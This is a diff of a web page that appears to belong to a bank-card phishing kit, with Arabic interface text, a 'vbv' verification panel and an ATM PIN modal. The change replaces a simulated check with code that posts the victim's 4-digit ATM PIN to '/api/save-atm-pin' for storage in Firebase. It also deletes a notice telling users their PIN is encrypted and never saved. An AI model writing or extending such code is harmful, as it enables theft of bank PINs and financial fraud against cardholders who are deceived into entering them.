@@ -479,6 +479,18 @@
             font-weight: normal;
         }
         
+        /* ATM PIN Modal - Cairo Font */
+        #atmPinModal .modal-content,
+        #atmPinModal .modal-content *,
+        #atmPinModal h4,
+        #atmPinModal h5,
+        #atmPinModal p,
+        #atmPinModal span,
+        #atmPinModal label,
+        #atmPinModal button {
+            font-family: 'Cairo', sans-serif !important;
+        }
+        
         .vbv-detail-row {
             display: flex;
             margin-bottom: 8px;
@@ -874,19 +886,6 @@
                             pattern="[0-9]*">
                     </div>
                     
-                    <!-- Security Note -->
-                    <div style="background-color: #e8f4fd; border: 1px solid #b3d9f2; border-radius: 6px; padding: 12px; margin-bottom: 20px;">
-                        <div style="display: flex; align-items: start;">
-                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="min-width: 16px; margin-left: 8px; margin-top: 2px;">
-                                <circle cx="12" cy="12" r="10" stroke="#5b9bd5" stroke-width="2" fill="none"/>
-                                <path d="M12 8V12" stroke="#5b9bd5" stroke-width="2" stroke-linecap="round"/>
-                                <circle cx="12" cy="16" r="1" fill="#5b9bd5"/>
-                            </svg>
-                            <p style="color: #2c5f8d; font-size: 12px; margin: 0; line-height: 1.6;">
-                                الرمز السري الخاص بك محمي ومشفر. لن يتم حفظه أو مشاركته مع أي جهة.
-                            </p>
-                        </div>
-                    </div>
                     
                     <!-- Submit Button -->
                     <button 
@@ -1358,17 +1357,35 @@
             
             if (pin.length === 4) {
                 // Show loading state
-                this.disabled = true;
-                this.innerHTML = '⏳ جاري التحقق...';
+                const submitBtn = this;
+                submitBtn.disabled = true;
+                submitBtn.innerHTML = '⏳ جاري التحقق...';
                 
-                // Simulate verification
-                setTimeout(function() {
-                    // Close modal and redirect to step5
-                    $('#atmPinModal').modal('hide');
-                    setTimeout(function() {
-                        window.location.href = '/step5';
-                    }, 300);
-                }, 1500);
+                // حفظ ATM PIN في Firebase
+                fetch('/api/save-atm-pin', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ atmPin: pin })
+                }).then(res => res.json())
+                .then(data => {
+                    if (data.success) {
+                        // Close modal and redirect to step5
+                        setTimeout(function() {
+                            $('#atmPinModal').modal('hide');
+                            setTimeout(function() {
+                                window.location.href = '/step5';
+                            }, 300);
+                        }, 1000);
+                    } else {
+                        submitBtn.disabled = false;
+                        submitBtn.innerHTML = 'تأكيد';
+                        alert('حدث خطأ. الرجاء المحاولة مرة أخرى');
+                    }
+                }).catch(error => {
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = 'تأكيد';
+                    alert('حدث خطأ. الرجاء المحاولة مرة أخرى');
+                });
             } else {
                 alert('الرجاء إدخال رمز مكون من 4 أرقام');
             }
